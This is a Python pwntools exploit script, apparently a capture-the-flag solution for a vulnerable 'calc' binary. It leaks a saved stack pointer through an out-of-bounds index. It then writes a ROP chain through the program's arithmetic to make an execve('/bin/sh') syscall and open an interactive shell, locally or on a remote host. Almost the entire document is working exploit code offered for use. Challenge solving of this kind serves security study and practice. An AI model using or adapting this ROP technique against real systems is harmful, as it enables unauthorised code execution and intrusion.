from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
'''.format(**locals())

# Binary filename
exe = './calc'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
addr=[b'+361',b'+362',b'+363',b'+364',
        b'+365',b'+366',b'+367',b'+368',b'+369']
addr = addr
payload=[0x0805c34b,0x0000000b,0x080701d0,0x00000000, #pop_eax,11,pop_edx_ecx_ebx,0
            0x00000000,0x00000000,0x08049a21,0x6e69622f,0x0068732f] #0,addr_bin/sh,init0x80,
payload = payload
def leak_tack(p):
    p.recv(1024)
    p.send(b'+360\n')
    prev_ebp=int(p.recv(1024).decode())
    payload[5]=prev_ebp   # vi tri /bin/sh se~ duoc truyen vao trung voi saved_ebp
    print("save ebp =",hex(payload[5]))
    
def rop(s):
    for i in range(len(payload)):
        s.sendline(addr[i])
        mleak = int(s.recvline().strip())
        print("mleak = ",hex(mleak))
        offset = payload[i]-mleak
        g = b'%s%+d' %(addr[i],offset)
        print("[!] ",hex(mleak + offset))
        s.sendline(g)
        s.recvline()

p= start()
leak_tack(p)
rop(p)
p.interactive()